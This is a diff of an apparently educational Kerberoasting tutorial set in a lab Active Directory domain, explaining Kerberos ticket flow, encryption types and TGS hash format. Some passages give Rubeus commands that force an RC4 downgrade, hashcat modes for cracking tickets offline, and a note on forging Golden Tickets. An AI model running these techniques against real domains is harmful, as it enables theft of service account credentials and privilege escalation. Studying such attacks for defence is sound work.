-                            │                 │
-                           AS                TGS
-                   (Authentication     (Ticket Granting
-                       Service)           Service)
+BAD WAY (No Kerberos):
+───────────────────────
+
+You want to:
+1. Enter Library → Guard asks: "Who are you?" → Show ID
+2. Enter Canteen → Staff asks: "Who are you?" → Show ID  
+3. Enter Lab → Teacher asks: "Who are you?" → Show ID
+4. Enter Classroom → Professor asks: "Who are you?" → Show ID
+
+Problems:
+- You show ID 100 times a day
+- Everyone needs to verify your ID
+- Your ID card could be stolen/copied
+- Slow, annoying, insecure
+
+GOOD WAY (Kerberos):
+─────────────────────
+
+Morning: You go to main office
+1. Show ID ONCE to office in-charge
+2. They give you a COLLEGE PASS for the day
+3. This pass has:
+   - Your name
+   - Your student ID
+   - Valid until: 5 PM today
+   - Stamp from office
+
+Throughout the day:
+- Library: Show pass → Enter (no ID verification!)
+- Canteen: Show pass → Enter (no questions!)
+- Lab: Show pass → Enter (instant!)
+- Classroom: Show pass → Enter (smooth!)
+
+Benefits:
+✅ Prove identity ONCE in the morning
+✅ Use pass all day
+✅ Each place trusts the office's stamp
+✅ Fast, convenient, secure
+✅ If pass is lost, it expires at 5 PM anyway
 ```
 
-**Key Distribution Center (KDC):**
-The Domain Controller runs TWO services:
-1. **AS (Authentication Service)** - Issues TGTs after password verification
-2. **TGS (Ticket Granting Service)** - Issues service tickets when shown a valid TGT
+**Now translate this to Kerberos:**
 
-## 1.3: The Complete Kerberos Flow
+| College | Kerberos | Purpose |
+|---------|----------|---------|
+| Main Office | KDC | Where you prove identity |
+| Your ID Card | Your password | Proves who you are |
+| Daily Pass | TGT (Ticket Granting Ticket) | Proves you're logged in |
+| Stamps for specific places | TGS (service tickets) | Access to specific services |
+| 5 PM expiry | 10-hour ticket lifetime | Security through time limits |
+
+**Why this design is genius:**
+
+1. **Password security:** Your password only travels ONCE during login
+2. **Scalability:** Services don't need to check with KDC for every access
+3. **Delegation:** You can forward tickets to other services
+4. **Time-limited:** Even if someone steals a ticket, it expires soon
+5. **Mutual authentication:** Both user and service verify each other
+
+---
+
+## 1.2: The Three Actors (Who's Involved?)
+
+Every Kerberos transaction involves 3 parties:
 
 ```
-DETAILED KERBEROS AUTHENTICATION:
+THE KERBEROS TRIANGLE:
 ────────────────────────────────────────────────────────────────
 
-CLIENT (vamsi.krishna)                    KDC (DC01)                         SERVICE (SQL)
-         │                                     │                                   │
-         │ ══════════════════════════════════════════════════════════════════════ │
-         │                   PHASE 1: GET THE TGT                                  │
-         │ ══════════════════════════════════════════════════════════════════════ │
-         │                                     │                                   │
-         │ 1. AS-REQ (Authentication Request)  │                                   │
-         │    ─────────────────────────────────>                                   │
-         │    Contains:                        │                                   │
-         │    • Username                       │                                   │
-         │    • Pre-auth (timestamp encrypted  │                                   │
-         │      with user's password hash)     │                                   │
-         │                                     │                                   │
-         │                                     │ KDC validates:                    │
-         │                                     │ • Decrypts timestamp with         │
-         │                                     │   user's hash from NTDS.dit       │
-         │                                     │ • Checks clock skew (±5 min)      │
-         │                                     │                                   │
-         │ 2. AS-REP (Authentication Response) │                                   │
-         │    <─────────────────────────────────                                   │
-         │    Contains:                        │                                   │
-         │    • TGT (encrypted with KRBTGT)    │                                   │
-         │    • Session key (enc with user's   │                                   │
-         │      hash - user can decrypt)       │                                   │
-         │                                     │                                   │
-         │ ══════════════════════════════════════════════════════════════════════ │
-         │                   PHASE 2: GET SERVICE TICKET                           │
-         │ ══════════════════════════════════════════════════════════════════════ │
-         │                                     │                                   │
-         │ 3. TGS-REQ (Service Ticket Request) │                                   │
-         │    ─────────────────────────────────>                                   │
-         │    Contains:                        │                                   │
-         │    • TGT                            │                                   │
-         │    • Target SPN (MSSQLSvc/sql:1433) │                                   │
-         │    • Authenticator (proves we have  │                                   │
-         │      the session key from step 2)   │                                   │
-         │                                     │                                   │
-         │                                     │ KDC process:                      │
-         │                                     │ 1. Decrypt TGT with KRBTGT        │
-         │                                     │ 2. Find account with that SPN     │
-         │                                     │ 3. Create TGS encrypted with      │ ←← THE VULNERABILITY
-         │                                     │    SERVICE ACCOUNT's password     │
-         │                                     │                                   │
-         │ 4. TGS-REP (Service Ticket Response)│                                   │
-         │    <─────────────────────────────────                                   │
-         │    Contains:                        │                                   │
-         │    • Service Ticket (TGS)           │                                   │
-         │      (encrypted with svc_sql hash!) │ ←← WE CAN CRACK THIS!             │
-         │    • Service session key            │                                   │
-         │                                     │                                   │
-         │ ══════════════════════════════════════════════════════════════════════ │
-         │                   PHASE 3: ACCESS THE SERVICE                           │
-         │ ══════════════════════════════════════════════════════════════════════ │
-         │                                                                         │
-         │ 5. AP-REQ (Application Request)     ─────────────────────────────────────>
-         │    Contains:                                                            │
-         │    • Service Ticket                                                     │
-         │    • Authenticator (proves session key)                                 │
-         │                                                                      │
-         │                                     Service decrypts with its own hash  │
-         │                                     Validates ticket, grants access     │
-         │                                                                         │
-         │ 6. AP-REP (Application Response)    <─────────────────────────────────────
-         │    Access granted!                                                      │
+         KDC (Key Distribution Center)
+         The "main office" in our analogy
+         Running on Domain Controller
+                    ▲
+                   ╱ ╲
+                  ╱   ╲
+                 ╱     ╲
+                ╱       ╲
+               ╱         ╲
+              ╱           ╲
+             ╱             ╲
+            ╱               ╲
+           ╱                 ╲
+          ╱      Issues       ╲      Verifies
+         ╱      tickets        ╲      tickets
+        ╱                       ╲
+       ╱                         ╲
+      ▼                           ▼
+   CLIENT                      SERVICE
+ (Your computer)            (SQL Server, File Share, etc.)
+   - Has password            - Has password
+   - Requests tickets        - Decrypts tickets
+   - Uses services           - Grants access
 ```
 
-## 1.4: The Vulnerability in Plain Terms
+**Let's understand each actor:**
 
-**The critical insight:**
+### 1.2.1: The CLIENT (You)
 
-> In step 4, the KDC encrypts the service ticket using the service account's password hash.
-> 
-> **The KDC gives this encrypted blob to us - the client.**
-> 
-> If we can GUESS the password that created this hash, we can decrypt the ticket.
-> This is Kerberoasting.
+```
+CLIENT = Your computer / your user account
+────────────────────────────────────────────────────────────────
 
-**Why does the KDC do this?**
+What you have:
+- Your username: vamsi.krishna
+- Your password: (only you know this!)
+- Your computer: WS01
 
-The service needs to verify the ticket, so it must be encrypted with something the service knows - its own password. This is by design, not a bug.
+What you do:
+1. Login in the morning
+2. Get TGT from KDC
+3. When you need SQL: Request TGS from KDC
+4. Use TGS to access SQL
+5. Repeat for file shares, printers, etc.
 
-## 1.5: The Cryptographic Keys Involved
+Where you are:
+- IP: 192.168.100.20 (WS01)
+- Logged in as: ORSUBANK\vamsi.krishna
+```
 
-| Step | Key Used | Who Knows It |
-|------|----------|--------------|
-| AS-REQ pre-auth | User's password hash | User, KDC |
-| TGT encryption | KRBTGT's hash | Only KDC |
-| AS-REP session key | User's password hash | User, KDC |
-| TGS (service ticket) | **Service account's hash** | Service, KDC |
-| TGS-REP service session key | User's TGT session key | User, KDC |
+### 1.2.2: The KDC (Key Distribution Center)
 
-**KRBTGT hash** = 128+ character random, rotates rarely → can't crack
-**Service account hash** = Admin-chosen password → often weak → CAN CRACK!
+```
+KDC = The ticket-issuing authority
+────────────────────────────────────────────────────────────────
+
+Actually TWO services inside:
+
+┌───────────────────────────────────────────────┐
+│              KDC (on DC01)                    │
+├───────────────────────────────────────────────┤
+│                                               │
+│  📌 AS (Authentication Service)               │
+│     - Handles login requests                  │
+│     - Verifies your password                  │
+│     - Issues TGT                              │
+│     - Only works when you first log in        │
+│                                               │
+│  📌 TGS (Ticket Granting Service)             │
+│     - Handles service ticket requests         │
+│     - Verifies your TGT                       │
+│     - Issues service tickets (TGS)            │
+│     - Works throughout your session           │
+│                                               │
+└───────────────────────────────────────────────┘
+
+Location: DC01 (192.168.100.10)
+Port: 88 (TCP/UDP)
+
+What it knows:
+- EVERYONE'S password hashes (from NTDS.dit)
+- Which accounts run which services (SPNs)
+- KRBTGT password (super secret!)
+```
+
+**Wait, what's KRBTGT?**
+
+```
+KRBTGT = The KDC's Own Account
+────────────────────────────────────────────────────────────────
+
+Think of it like this:
+
+Your password encrypts things only YOU can decrypt.
+KRBTGT's password encrypts things only KDC can decrypt.
+
+When KDC creates your TGT:
+- It encrypts it with KRBTGT's password
+- Only KDC can read it (because only KDC knows KRBTGT password)
+- You can't read your own TGT!
+- You just carry it and show it
+
+KRBTGT password:
+- 128+ character random string
+- Auto-generated by Windows
+- Rotates very rarely
+- If an attacker gets this → Golden Ticket Attack!
+```
+
+### 1.2.3: The SERVICE (What You Want to Access)
+
+```
+SERVICE = The resource you're trying to access
+────────────────────────────────────────────────────────────────
+
+Examples:
+- SQL Server (MSSQLSvc/DC01.orsubank.local:1433)
+- File Share (CIFS/fileserver.orsubank.local)
+- Web Server (HTTP/web.orsubank.local)
+
+What the service has:
+- A service account (e.g., svc_sql)
+- That account's password
+- An SPN registered in AD
+
+What the service does:
+1. You show up with a TGS ticket
+2. Service decrypts it with ITS password
+3. Service reads: "This is vamsi.krishna, valid until 8 PM"
+4. Service grants you access
+
+THE VULNERABILITY:
+─────────────────
+Because the ticket is encrypted with the SERVICE's password,
+if we can crack that password, we own the service!
+```
+
+---
+
+## 1.3: The Complete Kerberos Flow (Step-by-Step Breakdown)
+
+Alright, here's the FULL flow. I'll explain EVERY step.
+
+**SCENARIO:** You (vamsi.krishna) just logged into WS01 and want to access the SQL database.
+
+```
+THE COMPLETE KERBEROS AUTHENTICATION FLOW:
+────────────────────────────────────────────────────────────────
+
+MORNING: You arrive at office, turn on WS01, type password
+═══════════════════════════════════════════════════════════════
+
+PHASE 1: Getting Your TGT (This happens at login)
+──────────────────────────────────────────────────
+
+            YOU (WS01)                      KDC (DC01)
+         192.168.100.20              192.168.100.10:88
+                │                            │
+                │                            │
+ You type:      │                            │
+ Username: vamsi.krishna                    │
+ Password: Password123!                     │
+                │                            │
+ Computer       │                            │
+ calculates your│                            │
+ password HASH  │                            │
+ (NTLM hash)    │                            │
+                │                            │
+                │  ────── STEP 1: AS-REQ ────→
+                │                            │
+                │  "I'm vamsi.krishna"       │
+                │  "Here's a timestamp       │
+                │   encrypted with my        │
+                │   password hash"           │
+                │  "Please give me a TGT"    │
+                │                            │
+                │                          KDC thinks:
+                │                          "Let me check..."
+                │                          1. Does vamsi.krishna exist?
+                │                             → Checks NTDS.dit → YES!
+                │                          2. Can I decrypt timestamp?
+                │                             → Uses vamsi's hash → YES!
+                │                          3. Is timestamp recent?
+                │                             → Within 5 min → YES!
+                │                          4. OK, create TGT!
+                │                             → Encrypts with KRBTGT
+                │                            │
+                │  ← ──── STEP 2: AS-REP ────
+                │                            │
+                │  "Here's your TGT!"        │
+                │  "Use it to get service    │
+                │   tickets all day"         │
+                │  "Valid for 10 hours"      │
+                │                            │
+✅ LOGIN       │                            │
+SUCCESSFUL!    │                            │
+You now have   │                            │
+a TGT saved in │                            │
+memory         │                            │
+                │                            │
+
+
+11:00 AM: You want to access SQL Server
+════════════════════════════════════════
+
+PHASE 2: Getting Service Ticket (Happens when accessing SQL)
+──────────────────────────────────────────────────────────────
+
+            YOU (WS01)                      KDC (DC01)              SQL SERVER
+         192.168.100.20              192.168.100.10:88         (DC01:1433)
+                │                            │                         │
+ You double-    │                            │                         │
+ click SQL      │                            │                         │
+ Management     │                            │                         │
+ Studio         │                            │                         │
+                │                            │                         │
+ Computer       │                            │                         │
+ needs ticket   │                            │                         │
+ for SQL        │                            │                         │
+                │                            │                         │
+                │  ───── STEP 3: TGS-REQ ────→                        │
+                │                            │                         │
+                │  "I have this TGT"         │                         │
+                │  "I want to access         │                         │
+                │   MSSQLSvc/DC01:1433"      │                         │
+                │  "Please give me a         │                         │
+                │   service ticket"          │                         │
+                │                            │                         │
+                │                          KDC thinks:                │
+                │                          "Let me process this..."   │
+                │                          1. Is TGT valid?           │
+                │                             → Decrypt with KRBTGT → YES!
+                │                          2. Who runs MSSQLSvc/DC01:1433?
+                │                             → Checks SPNs → svc_sql
+                │                          3. Get svc_sql's password hash
+                │                             → From NTDS.dit
+                │                          4. Create service ticket
+                │                             → Encrypt with svc_sql's hash! 🔥
+                │                          5. This is THE vulnerability!
+                │                            │                         │
+                │  ← ──── STEP 4: TGS-REP ───                         │
+                │                            │                         │
+                │  "Here's your service      │                         │
+                │   ticket for SQL!"         │                         │
+                │  [Encrypted blob]          │                         │
+                │  "Show this to SQL server" │                         │
+                │                            │                         │
+✅ GOT         │                            │                         │
+SERVICE        │                            │                         │
+TICKET!        │                            │                         │
+                │                            │                         │
+⚠️  THIS       │                            │                         │
+TICKET IS      │                            │                         │
+ENCRYPTED WITH │                            │                         │
+svc_sql's      │                            │                         │
+PASSWORD!      │                            │                         │
+                │                            │                         │
+
+
+PHASE 3: Accessing SQL Server (Using the ticket)
+──────────────────────────────────────────────────
+
+            YOU (WS01)                                          SQL SERVER
+         192.168.100.20                                       (DC01:1433)
+                │                                                   │
+                │  ─────────── STEP 5: AP-REQ ───────────────────→ │
+                │                                                   │
+                │  "Here's my service ticket"                       │
+                │  [Shows encrypted ticket]                         │
+                │                                                   │
+                │                                              SQL thinks:
+                │                                              "Let me verify..."
+                │                                              1. Decrypt with MY password
+                │                                                 → Uses svc_sql's password
+                │                                              2. Is ticket valid?
+                │                                                 → Checks timestamp → YES!
+                │                                              3. Who is this for?
+                │                                                 → vamsi.krishna
+                │                                              4. OK, grant access!
+                │                                                   │
+                │  ← ────────── STEP 6: AP-REP ──────────────────  │
+                │                                                   │
+                │  "Access granted!"                                │
+                │  "You can now query database"                     │
+                │                                                   │
+✅ ACCESSING   │                                                   │
+SQL NOW!       │                                                   │
+```
+
+**THE MAGIC MOMENT - Understanding the Vulnerability:**
+
+Look at **STEP 4** carefully:
+
+```
+🔥 VULNERABILITY EXPLAINED:
+────────────────────────────────────────────────────────────────
+
+In STEP 4, the KDC:
+1. Checks: "Who runs MSSQLSvc/DC01:1433?" → svc_sql
+2. Gets: svc_sql's password hash from NTDS.dit
+3. Encrypts service ticket with that hash
+4. Gives YOU the encrypted ticket
+
+YOU now have:
+- An encrypted blob
+- It's encrypted with svc_sql's password
+- You can take it home
+- Try to crack it offline
+- NO ONE KNOWS you're trying!
+
+If you crack it:
+- You get svc_sql's password: "MYpassword123#"
+- You can log in as svc_sql
+- If svc_sql is Domain Admin → GAME OVER!
+
+This is Kerberoasting! 🎯
+```
+
+---
+
+## 1.4: The Cryptographic Keys - Who Knows What?
+
+This is important - different passwords/keys encrypt different things.
+
+```
+THE KEY RING - Who Knows Which Password:
+────────────────────────────────────────────────────────────────
+
+┌─────────────────────────────────────────────────────────┐
+│  STEP 1: You → KDC (Login)                              │
+├─────────────────────────────────────────────────────────┤
+│  Your password hash is used to:                         │
+│  - Encrypt the timestamp you send                       │
+│  - Decrypt the session key KDC sends back               │
+│                                                          │
+│  Who knows your password hash:                          │
+│  ✅ YOU (your computer calculates it)                   │
+│  ✅ KDC (stored in NTDS.dit)                            │
+│  ❌ No one else                                         │
+└─────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────┐
+│  STEP 2: KDC → You (TGT issued)                         │
+├─────────────────────────────────────────────────────────┤
+│  KRBTGT's password hash is used to:                     │
+│  - Encrypt your TGT                                     │
+│                                                          │
+│  Who knows KRBTGT password:                             │
+│  ❌ NOT YOU (you can't read your own TGT!)              │
+│  ✅ ONLY KDC                                            │
+│  ❌ No service can read it                              │
+│                                                          │
+│  This is WHY you can't forge a TGT - you don't have     │
+│  KRBTGT's password (unless Golden Ticket attack!)       │
+└─────────────────────────────────────────────────────────┘
+
+┌─────────────────────────────────────────────────────────┐
+│  STEP 4: KDC → You (Service ticket issued)              │
+├─────────────────────────────────────────────────────────┤
+│  SERVICE ACCOUNT's password hash is used to:            │
+│  - Encrypt the service ticket (TGS)                     │
+│                                                          │
+│  Who knows service account password:                    │
+│  ✅ The SERVICE (e.g., SQL Server as svc_sql)           │
+│  ✅ KDC (stored in NTDS.dit)                            │
+│  ❌ NOT YOU (you can't read the TGS either!)            │
+│                                                          │
+│  🔥 THE VULNERABILITY:                                  │
+│  KDC gives you this encrypted blob.                     │
+│  You can TRY to crack the service password offline!     │
+│  If password is weak → You win!                         │
+│  If password is strong (120+ chars) → You lose          │
+└─────────────────────────────────────────────────────────┘
+```
+
+**Why can't we crack the TGT but CAN crack the TGS?**
+
+| Property | TGT | TGS (Service Ticket) |
+|----------|-----|----------------------|
+| Encrypted with | KRBTGT password | Service account password |
+| KRBTGT password | 128+ random chars | - |
+| Service password | - | Often weak: "MYpassword123#" |
+| Can we crack it? | ❌ NO (too strong) | ✅ YES (if weak password!) |
+| Who set the password? | Windows (auto) | Human admin |
+| Rotates? | Rarely (years) | Almost never |
+
+---
+
+## 1.5: Why Does the KDC Do This? (The Design Logic)
+
+**Big question:** "Why does KDC encrypt tickets with service passwords? Isn't that insecure?"
+
+**Answer:** It's by design, and here's why:
+
+```
+THE DESIGN REASONING:
+────────────────────────────────────────────────────────────────
+
+PROBLEM TO SOLVE:
+─────────────────
+SQL Server needs to verify you without asking KDC every time.
+
+WHY NOT ASK KDC?
+────────────────
+Imagine SQL has 1000 users connecting per minute.
+If SQL asked KDC for each: "Is vamsi.krishna allowed?"
+- KDC would be overloaded
+- Single point of failure
+- Latency on every access
+- Not scalable!
+
+THE TICKET SOLUTION:
+────────────────────
+Instead:
+1. KDC creates a ticket that says: "vamsi.krishna is allowed"
+2. Encrypts it with SQL's password
+3. Only SQL can decrypt it
+4. SQL verifies ticket locally (no KDC needed!)
+5. Scalable, fast, distributed
+
+THE TRADE-OFF:
+──────────────
+✅ PRO: Scalable, no central bottleneck
+✅ PRO: Services verify independently  
+✅ PRO: Tickets are time-limited (expire in 10 hours)
+
+❌ CON: If service password is weak, we can crack it!
+
+MICROSOFT'S ASSUMPTION IN 2000:
+───────────────────────────────
+"Service accounts will have STRONG passwords or be computer accounts"
+
+REALITY IN 2024:
+────────────────
+"Admins still use: svc_sql / MYpassword123#"
+```
+
+**This is not a bug - it's a calculated trade-off that favors scalability over perfect security.**
+
+---
+
+## 1.6: Quick Recap - The Keys Summary
+
+Before moving on, make sure you understand this:
+
+```
+THE THREE KEY CONCEPTS:
+────────────────────────────────────────────────────────────────
+
+1. YOUR PASSWORD
+   - Encrypts: Pre-auth timestamp at login
+   - Who knows: You and KDC
+   - Crackable?: Already yours!
+
+2. KRBTGT PASSWORD  
+   - Encrypts: Your TGT
+   - Who knows: Only KDC
+   - Crackable?: NO (128+ random chars)
+   - If compromised: Golden Ticket attack
+
+3. SERVICE PASSWORD 👈 THE VULNERABILITY!
+   - Encrypts: Service tickets (TGS)
+   - Who knows: Service and KDC
+   - Crackable?: YES (if weak password!)
+   - If cracked: Own the service!
+
+KERBEROASTING = Cracking the SERVICE PASSWORD from TGS ticket
+```
 
 ---
 
 # PART 2: Ticket Structure and Encryption {#part-2-ticket-structure}
 
-## 2.1: Anatomy of a Kerberos Ticket
-
-**A TGS ticket contains:**
-
-```
-TGS TICKET STRUCTURE:
-────────────────────────────────────────────────────────────────
-
-┌─────────────────────────────────────────────────────────────┐
-│                    ENCRYPTED PORTION                         │
-│              (Encrypted with service account hash)           │
-├─────────────────────────────────────────────────────────────┤
-│ • Session Key (for client-service communication)             │
-│ • Client Principal Name (who this ticket is for)             │
-│ • Client Realm (domain)                                      │
-│ • Ticket Flags (forwardable, renewable, etc.)                │
-│ • Auth Time (when user authenticated)                        │
-│ • Start Time (when ticket becomes valid)                     │
-│ • End Time (when ticket expires - typically 10 hours)        │
-│ • Authorization Data (PAC - Privilege Attribute Cert)        │
-│   └── User's SID                                             │
-│   └── Group SIDs (what groups user is in)                    │
-│   └── User account control flags                             │
-└─────────────────────────────────────────────────────────────┘
-```
-
-**The PAC (Privilege Attribute Certificate) is critical:**
-It contains the user's security context - their SID and all group memberships. When forging Golden Tickets, we can inject arbitrary groups (like Domain Admins).
-
-## 2.2: Encryption Types (etypes)
-
-**Kerberos supports multiple encryption algorithms:**
-
-| Etype | Algorithm | Hash Mode | Crack Speed | Status |
-|-------|-----------|-----------|-------------|--------|
-| 23 | RC4-HMAC | 13100 | ~1M/sec GPU | Common, weak |
-| 17 | AES128-CTS-HMAC-SHA1-96 | 19600 | ~100K/sec | Better |
-| 18 | AES256-CTS-HMAC-SHA1-96 | 19700 | ~100K/sec | Best |
-| 3 | DES-CBC-MD5 | - | Very fast | Deprecated |
-
-**RC4 (etype 23) is 10x faster to crack than AES.**
-
-**How encryption is negotiated:**
-1. Client advertises supported etypes in TGS-REQ
-2. KDC picks strongest etype supported by BOTH client and service account
-3. If we only advertise RC4, we might get RC4 (if service supports it)
-
-**Rubeus downgrade attack:**
-```bash
-Rubeus.exe kerberoast /tgtdeleg /enctype:rc4
-```
-This requests RC4 encryption even if AES is available.
-
-## 2.3: The Hash Format
-
-**When we extract a TGS, it looks like:**
-
-```
-$krb5tgs$23$*svc_sql$ORSUBANK.LOCAL$MSSQLSvc/sql.orsubank.local:1433*$a1b2c3d4e5f6...
-```
-
-**Breaking it down:**
-
-| Component | Value | Meaning |
-|-----------|-------|---------|
-| `$krb5tgs$` | - | Kerberos 5 TGS hash identifier |
-| `23` | etype | 23 = RC4-HMAC |
-| `*svc_sql` | username | Service account name |
-| `ORSUBANK.LOCAL` | realm | Domain name |
-| `MSSQLSvc/sql...` | SPN | Service Principal Name |
-| `$a1b2c3d4...` | encrypted data | The actual ticket data to crack |
-
-**Hashcat modes:**
-- 13100 = Kerberos 5 TGS-REP etype 23 (RC4)
-- 19600 = Kerberos 5 TGS-REP etype 17 (AES128)
-- 19700 = Kerberos 5 TGS-REP etype 18 (AES256)
-
-## 2.4: How Cracking Works
-
-**Hashcat's process:**
-
-```
-FOR each password in wordlist:
-    1. Compute NTLM hash of password
-    2. Use NTLM hash as RC4 key
-    3. Attempt to decrypt the ticket data
-    4. Check if decryption produces valid structure
-    5. If valid → PASSWORD FOUND!
-```
-
-**Speed factors:**
-- GPU power (RTX 3090 = ~2.5M hashes/sec for RC4)
-- Wordlist quality
-- Rule mutations
-- AES is ~10x slower than RC4
+> **🎫 WHAT WE'LL LEARN:**
+>
+> - What's actually INSIDE a Kerberos ticket
+> - Why RC4 is 10x easier to crack than AES
+> - How to read the hash format  
+> - How Hashcat actually cracks these tickets
+>
+> Think of a ticket like an **encrypted message in a bottle**.
+> You found the bottle, but need the key to read the message!
 
 ---
 
-# PART 3: Service Principal Names Deep Dive {#part-3-spn-internals}
+## 2.1: What's Inside a Kerberos Ticket? (Opening the Encrypted Box)
 
-## 3.1: What SPNs Really Are
+When you get a TGS ticket from the KDC, you get an **encrypted blob of data**.
 
-**SPN = Service Principal Name = The "address" of a Kerberos service**
+**Let me explain what's inside using an analogy:**
 
-When a client wants to access a service, it needs to tell the KDC WHICH service. SPNs provide this mapping.
+```
+🎟️ THINK OF IT LIKE A MOVIE TICKET:
+────────────────────────────────────────────────────────────────
+
+A movie ticket has:
+- ✅ Your name (who can use it)
+- ✅ Movie name (which movie)
+- ✅ Show time (when it's valid)
+- ✅ Seat number (what access you get)
+- ✅ Expiry (when it becomes invalid)
+- ✅ Theater stamp (proves it's genuine)
+
+A KERBEROS TICKET has:
+────────────────────────────────────────────────────────────────
+
+┌─────────────────────────────────────────────────────────────┐
+│  🔒 ENCRYPTED PORTION (Only service can read this!)         │
+│     Encrypted with: svc_sql's password hash                │
+├─────────────────────────────────────────────────────────────┤
+│                                                              │
+│  1. WHO CAN USE THIS TICKET:                                │
+│     • Client Name: vamsi.krishna                            │
+│     • Domain: ORSUBANK.LOCAL                                │
+│                                                              │
+│  2. WHICH SERVICE:                                          │
+│     • Service: MSSQLSvc/DC01.orsubank.local:1433           │
+│                                                              │
+│  3. WHEN IT'S VALID:                                        │
+│     • Start Time: 11:00 AM (when created)                   │
+│     • End Time: 9:00 PM (expires in 10 hours)              │
+│     • Auth Time: 9:00 AM (when you logged in)              │
+│                                                              │
+│  4. WHAT ACCESS YOU HAVE:                                   │
+│     • PAC (Privilege Attribute Certificate):                │
+│       ├─ Your SID: S-1-5-21-xxx-xxx-xxx-1105               │
+│       ├─ Groups you're in:                                  │
+│       │   • Domain Users                                    │
+│       │   • IT_Team                                         │
+│       │   • SQL_Readers                                     │
+│       └─ Your privileges/permissions                        │
+│                                                              │
+│  5. SECURITY STUFF:                                         │
+│     • Session Key: [random 256-bit key]                     │
+│     • Flags: FORWARDABLE, RENEWABLE                         │
+│     • Sequence Number: 12345                                │
+│                                                              │
+└─────────────────────────────────────────────────────────────┘
+```
+
+**The CRITICAL part - PAC (Privilege Attribute Certificate):**
+
+```
+PAC = Your "ID card" inside the ticket
+────────────────────────────────────────────────────────────────
+
+Imagine you're entering a club. The bouncer checks:
+- Who are you? → Your SID
+- What groups are you in? → Domain Users, IT_Team, etc.
+- Are you VIP? → Group memberships
+
+THE PAC CONTAINS:
+─────────────────
+• Your SID (Security Identifier)
+  Example: S-1-5-21-3623811015-3361044348-30300820-1105
+
+• Every group you're a member of:
+  - Domain Users
+  - IT_Team
+  - SQL_Readers  
+  - (If you were Domain Admin, it would list that too!)
+
+• Account control flags:
+  - Normal account
+  - Password never expires
+  - Account enabled
+
+WHY THIS MATTERS FOR GOLDEN TICKETS:
+─────────────────────────────────────
+When forging Golden Tickets, we can INJECT any groups!
+- Add "Domain Admins" to the PAC
+- Service reads PAC: "Oh, this user is Domain Admin!"
+- Instant admin access!
+
+But for Kerberoasting, we're just trying to CRACK the service password.
+```
+
+---
+
+## 2.2: Encryption Types - RC4 vs AES (The Speed Battle)
+
+**Big question:** "I keep hearing about RC4 and AES. What's the difference?"
+
+**Answer:** RC4 is an older, WEAKER encryption. AES is newer, STRONGER.
+
+```
+ENCRYPTION TYPE COMPARISON:
+────────────────────────────────────────────────────────────────
+
+                RC4-HMAC              vs              AES256
+              (etype 23)                            (etype 18)
+          
+Age:          Old (1987)                          New (2001)
+Strength:     WEAK                                STRONG
+Hashcat Mode: 13100                               19700
+GPU Speed:    2,500,000/sec                       250,000/sec
+              (RTX 3090)                          (RTX 3090)
+
+                    ↓                                 ↓
+              10x FASTER TO CRACK!              10x SLOWER
+
+Time to crack "SqlSvc@2024!":
+              ~2 minutes                          ~20 minutes
+```
+
+**Real-world speed comparison:**
+
+| Passwordstrength | RC4 Crack Time | AES256 Crack Time |
+|------------------|----------------|-------------------|
+| "password123" | Seconds | Seconds |
+| "SqlSvc@2024!" | Minutes | Hours |
+| "MyP@ssw0rd2024!" | Hours | Days |
+| "Tr0ub4dor&3!" | Days | Weeks |
+| "correct-horse-battery-staple" | Weeks | Months |
+
+**Why does Microsoft still support RC4?**
+
+```
+THE BACKWARDS COMPATIBILITY PROBLEM:
+────────────────────────────────────────────────────────────────
+
+Windows 2000/2003 only supported RC4.
+
+If your company has:
+- Old applications from 2005
+- Legacy systems
+- Devices that only know RC4
+
+Then you MUST keep RC4 enabled or those systems break!
+
+MICROSOFT'S POSITION:
+─────────────────────
+"We recommend AES, but we keep RC4 for compatibility"
+
+ATTACKER'S POSITION:
+────────────────────
+"Thank you for leaving RC4 enabled! 😈"
+```
+
+---
+
+## 2.3: How Encryption is Negotiated (The Downgrade Attack)
+
+**This is sneaky - we can FORCE the KDC to use RC4 even if AES is available!**
+
+```
+NORMAL ENCRYPTION NEGOTIATION:
+────────────────────────────────────────────────────────────────
+
+Client:  "Hey KDC, I support: RC4, AES128, AES256"
+         
+KDC:     "Let me check what svc_sql supports..."
+         [Checks msDS-SupportedEncryptionTypes attribute]
+         "svc_sql supports: RC4, AES128, AES256"
+         "I'll pick the STRONGEST common one: AES256"
+         
+Result:  Ticket encrypted with AES256 (hard to crack!)
+
+
+DOWNGRADE ATTACK (What we do):
+────────────────────────────────────────────────────────────────
+
+Client:  "Hey KDC, I ONLY support: RC4"
+         (We lie!)
+         
+KDC:     "Let me check what svc_sql supports..."
+         "svc_sql supports: RC4, AES128, AES256"
+         "I'll pick the STRONGEST common one: RC4"
+         (Only RC4 is common between client and service)
+         
+Result:  Ticket encrypted with RC4 (easy to crack!)
+```
+
+**How to force RC4 in Rubeus:**
+
+```bash
+# Method 1: Direct RC4 request
+Rubeus.exe kerberoast /enctype:rc4
+
+# Method 2: TGT delegation (even more reliable)
+Rubeus.exe kerberoast /tgtdeleg /enctype:rc4
+
+# What /tgtdeleg does:
+# - Requests a special TGT that can be delegated
+# - This TGT is ALWAYS RC4 (Windows limitation)
+# - Use that RC4 TGT to request service tickets
+# - Service tickets inherit RC4 encryption!
+```
+
+---
+
+## 2.4: The Hash Format - Reading the Encrypted Ticket
+
+When Rubeus extracts a ticket, you get a long string. Let's decode it!
+
+```
+EXAMPLE HASH:
+────────────────────────────────────────────────────────────────
+
+$krb5tgs$23$*sqlservice$ORSUBANK.LOCAL$MSSQLSvc/DC01.orsubank.local:1433*$81F5AC37E2B4D9F1C8A3E6D5B2F9C1A4E7B3C6D9F2A5B8C1D4E7F3A6B9C2D5E8F1A4B7C3D6E9F2A5B8...
+
+Let's break this down piece by piece:
+```
+
+**Component-by-component breakdown:**
+
+```
+$krb5tgs$
+└─ This identifies it as a "Kerberos 5 TGS hash"
+   Tells Hashcat: "Hey, this is a Kerberos service ticket!"
+
+23$
+└─ Encryption type (etype)
+   23 = RC4-HMAC
+   17 = AES128
+   18 = AES256
+   This tells Hashcat WHICH algorithm to use
+
+*sqlservice$
+└─ The service account name
+   This is WHO the ticket is for
+   We're trying to crack sqlservice's password
+
+ORSUBANK.LOCAL$
+└─ The domain (realm) name
+   Which Active Directory domain
+
+MSSQLSvc/DC01.orsubank.local:1433*
+└─ The SPN (Service Principal Name)
+   Which exact service this ticket is for
+
+$81F5AC37E2B4D9F1C8A3E6D5B2F9C1A4E7B3C6D9F2A5B8C1D4E7F3A6B9C2D5E8F1A4B7C3D6E9F2A5B8...
+└─ THE ACTUAL ENCRYPTED TICKET DATA
